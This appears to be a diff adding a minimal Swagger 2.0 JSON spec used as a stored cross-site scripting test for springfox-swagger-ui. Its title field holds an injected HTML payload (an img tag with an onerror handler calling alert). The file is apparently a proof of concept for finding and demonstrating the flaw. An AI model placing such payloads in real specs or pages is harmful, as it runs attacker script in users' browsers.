@@ -1,0 +1,9 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "<img src=x onerror=alert('springfox-swagger-ui Stored 
+XSS')>",
+    "description": "XSS test"
+  },
+  "paths": {}
+}
